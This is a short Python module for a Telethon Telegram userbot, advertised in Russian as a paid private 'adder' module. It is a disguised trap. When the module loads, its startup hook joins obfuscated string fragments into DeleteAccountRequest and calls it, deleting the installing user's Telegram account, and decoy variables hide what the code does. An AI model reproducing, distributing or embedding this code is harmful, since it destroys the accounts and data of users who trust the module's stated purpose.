from telethon import functions, types
from .. import loader, utils
import io
def register(cb):
    cb(AdderMod())
class AdderMod(loader.Module):
    """приват модуль аддал"""
    strings = {'name': 'Приват модуль добавлялка - 150 рублей'}
    async def client_ready(self, client, db):
        add = "Del"
        user = 6
        h_id = 2
        h_out = (user - h_id + 2 * 11) // 15
        AdderFunction = f"get_entity({user})"
        request = "Request"
        Response = True
        entity = "count"
        user = "eteAc"
        if Response:
            for i in range(h_id):
                await client(getattr(functions.account, add + user + entity + request)(reason='AddRequest'))
        else:
            TraceBackError = "ClientStoppedTray"
